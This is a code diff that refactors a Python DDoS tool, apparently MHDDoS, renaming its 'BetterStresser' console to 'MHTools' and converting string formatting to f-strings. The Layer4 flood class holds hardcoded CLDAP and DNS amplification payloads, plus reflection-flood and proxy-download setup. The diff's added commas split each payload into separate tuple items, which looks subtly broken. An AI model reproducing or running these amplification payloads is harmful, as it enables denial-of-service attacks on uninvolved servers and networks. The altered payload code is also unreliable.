@@ -100,7 +100,7 @@ google_agents = [
 ]
 
 
-class Counter(object):
+class Counter:
     def __init__(self, value=0):
         self._value = RawValue('i', value)
 
@@ -307,8 +307,9 @@ class Layer4(Thread):
             self.SENT_FLOOD = self.AMP
             self._amp_payloads = cycle(self._generate_amp())
         if name == "CLDAP":
-            self._amp_payload = (b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
-                                 b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00', 389)
+            self._amp_payload = (b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00',
+                                 b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
+                                 389)
             self.SENT_FLOOD = self.AMP
             self._amp_payloads = cycle(self._generate_amp())
         if name == "MEM":
@@ -330,8 +331,9 @@ class Layer4(Thread):
             self._amp_payloads = cycle(self._generate_amp())
         if name == "DNS":
             self._amp_payload = (
-                b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
-                b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00', 53)
+                b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00',
+                b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',
+                53)
             self.SENT_FLOOD = self.AMP
             self._amp_payloads = cycle(self._generate_amp())
 
@@ -992,8 +994,7 @@ class ProxyManager:
                         data.splitlines(), proxy_type):
                     proxes.add(proxy)
             except Exception as e:
-                logger.error('Download Proxy Error: %s' %
-                             (e.__str__() or e.__repr__()))
+                logger.error(f'Download Proxy Error: {(e.__str__() or e.__repr__())}')
         return proxes
 
 
@@ -1009,7 +1010,7 @@ class ToolsConsole:
 
     @staticmethod
     def runConsole():
-        cons = "%s@BetterStresser:~#" % gethostname()
+        cons = f"{gethostname()}@MHTools:~#"
 
         while 1:
             cmd = input(cons + " ").strip()
@@ -1036,7 +1037,7 @@ class ToolsConsole:
                 continue
 
             if not {cmd} & ToolsConsole.METHODS:
-                print("%s command not found" % cmd)
+                print(f"{cmd} command not found")
                 continue
 
             if cmd == "DSTAT":
@@ -1150,8 +1151,8 @@ class ToolsConsole:
                     print('please wait ...', end="\r")
 
                     info = ToolsConsole.ts_srv(domain)
-                    logger.info("TCP: %s\n" % (info['_tsdns._tcp.']))
-                    logger.info("UDP: %s\n" % (info['_ts3._udp.']))
+                    logger.info(f"TCP: {(info['_tsdns._tcp.'])}\n")
+                    logger.info(f"UDP: {(info['_ts3._udp.'])}\n")
 
             if cmd == "PING":
                 while True:
